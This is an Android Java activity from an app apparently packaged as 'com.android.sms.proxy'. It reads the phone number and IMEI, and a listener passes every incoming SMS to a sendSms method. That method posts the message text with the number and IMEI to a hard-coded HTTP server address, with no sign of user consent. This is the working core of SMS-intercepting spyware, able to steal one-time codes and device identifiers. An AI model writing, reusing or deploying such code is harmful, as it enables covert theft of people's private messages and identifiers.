package com.android.sms.proxy.ui;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.R;
import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.entity.SpSimpleJsonImpl;
import com.android.sms.proxy.loader.Loader_Base_ForCommon;
import com.android.sms.proxy.service.AlarmControl;
import com.android.sms.proxy.service.Receiver_SMS;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;

import java.util.HashMap;
import java.util.Map;

/**
 * @author zyq 16-3-10
 */
public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnReceiveSMSListener {

	private static final String TAG = "main";
	public static final String NETWORK_CACHE_DIR = "volley";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main_activity);

		AlarmControl.getInstance(this).initAlarm(15, 52, 0, 0);
		String phoneNumber = PhoneInfo.getInstance(this).getNativePhoneNumber();
		Log.d(TAG, "手机号码:" + phoneNumber);
		String imei = PhoneInfo.getInstance(this).getIMEI();
		Log.d(TAG, "imei:" + imei);
	}

	@Override
	public void onReceiveSMS(String sms) {
		Log.d(TAG, "短信内容为:" + sms);
        sendSms(sms);
	}

	public void sendSms(String sms){
        String number = PhoneInfo.getInstance(this).getNativePhoneNumber();
		if(TextUtils.isEmpty(number)) return;
		Map<String,String> map = new HashMap<>();
		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(this).getNativePhoneNumber());
		map.put(NativeParams.TYPE_PHONE_IMEI,PhoneInfo.getInstance(this).getIMEI());
		map.put(NativeParams.TYPE_PHONE_SMS, sms);
		String url = "http://172.16.5.29:8000/regist/";
		RequestEntity<SpSimpleJsonImpl> entity = new RequestEntity<SpSimpleJsonImpl>(url,SpSimpleJsonImpl.class,map);
		Loader_Base_ForCommon.getInstance().onRequestLoadNetworkTask(entity, true, new Response.Listener() {
			@Override
			public void onResponse(Object response) {
				if(response instanceof SpSimpleJsonImpl){
					int code = ((SpSimpleJsonImpl) response).getCode();
					if(code == NativeParams.SUCCESS){
						String data = ((SpSimpleJsonImpl) response).getData();
						Log.d(TAG,"返回数据:"+data);
					}
				}
			}
		}, new Response.ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError error) {
                 Log.d(TAG,error.toString());
			}
		});
	}
	@Override
	protected void onDestroy() {
		super.onDestroy();
	}
}
